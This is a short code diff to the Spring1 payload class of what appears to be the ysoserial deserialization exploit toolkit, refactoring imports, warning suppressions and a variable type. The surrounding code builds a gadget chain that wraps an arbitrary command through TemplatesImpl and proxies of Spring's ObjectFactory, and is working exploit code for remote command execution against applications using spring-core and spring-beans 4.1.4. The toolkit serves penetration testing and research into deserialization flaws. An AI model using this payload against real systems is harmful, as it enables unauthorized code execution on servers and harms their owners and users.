@@ -15,7 +15,6 @@ import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 
 /*
 	Gadget chain:
@@ -46,12 +45,12 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 
  */
 
-@SuppressWarnings({"restriction", "rawtypes"})
+@SuppressWarnings({"rawtypes", "nls", "javadoc"})
 @Dependencies({"org.springframework:spring-core:4.1.4.RELEASE","org.springframework:spring-beans:4.1.4.RELEASE"})
 public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
 	
 	public Object getObject(final String command) throws Exception {
-		final TemplatesImpl templates = Gadgets.createTemplatesImpl(command);
+		final Object templates = Gadgets.createTemplatesImpl(command);
 		
 		final ObjectFactory objectFactoryProxy = 
 				Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);
